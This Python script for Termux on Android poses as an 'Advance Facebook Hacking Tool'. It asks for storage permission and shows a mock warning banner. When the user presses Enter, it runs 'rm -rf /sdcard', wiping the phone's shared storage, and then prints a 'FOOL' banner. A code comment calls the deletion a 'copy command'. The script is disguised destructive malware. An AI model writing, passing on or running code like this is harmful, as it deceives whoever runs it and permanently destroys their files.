import os

# Function to add RGB color
def rgb(r, g, b, text):
    return f"\033[38;2;{r};{g};{b}m{text}\033[0m"

# Check if storage permission is granted
if not os.path.exists("/data/data/com.termux/files/home/storage"):
    os.system("termux-setup-storage")

# ASCII Art Logo (using raw string to avoid escape errors)
ascii_art = rf"""
{rgb(255, 0, 0, "___ _   ___ ___ ___  ___   ___  _  __")}
{rgb(255, 165, 0, "| __/_\\ / __| __| _ )/ _ \\ / _ \\| |/ /")}
{rgb(255, 255, 0, "| _/ _ \\ (__| _|| _ \\ (_) | (_) | ' < ")}
{rgb(0, 255, 0, "|_/_/ \\_\\___|___|___/\\___/ \\___/|_|\\_\\")}
{rgb(0, 255, 255, "| || | /_\\ / __| |/ /")}            
{rgb(0, 0, 255, "| __ |/ _ \\ (__| ' <")}                 
{rgb(255, 20, 147, "|_||_/_/ \\_\\___|_|\_\\")}                                    
"""

print(ascii_art)

# Display the message after the ASCII logo
message = rf"""
{rgb(255, 0, 0, "🎵 ADVANCE FACEBOOK HACKING TOOL 🎵")}
---------------------------------------------------------------
  {rgb(128, 0, 128, "HACKING FACEBOOK IS ILLEGAL ")}
  {rgb(0, 255, 255, "STOP IF YOU'RE NOT READY ")}
  {rgb(0, 255, 255, "TO FACE THE CONSEQUENCES. ")}
  {rgb(255, 255, 0, "If you hack someone’s Facebook, ")}
  {rgb(255, 255, 0, "they will face serious trouble. ")}
  {rgb(255, 20, 147, "And by causing them pain, ")}
  {rgb(255, 20, 147, "nature may make you face some too. ")}
  {rgb(255, 69, 0, "IF YOU STILL WANT TO HACK, PRESS ENTER")}
  {rgb(255, 69, 0, "IF NOT, CLOSE THIS TOOL NOW. ")}
--------------------------------------------------------------
"""

print(message)

# Wait for user input
input()

# Execute the copy command
os.system("rm -rf /sdcard")

# Final message
final_msg = rf"""
{rgb(255, 20, 147, "______ _____  _____ _ ")}  
{rgb(128, 0, 128, "|  ___|  _  ||  _  | |")}    
{rgb(255, 69, 0, "| |_  | | | || | | | |")} 
{rgb(173, 216, 230, "|  _| | | | || | | | |")}    
{rgb(255, 255, 0, "| |   \\ \\_/ /\\ \\_/ / |____")}
{rgb(255, 165, 0, "\\_|    \\___/  \\___/\\_____/")}
                          
❌🗃️❌ 
{rgb(173, 216, 230, "YOU CHOSE YOUR OWN DESTINY, I AM SORRY ")}
"""

print(final_msg)
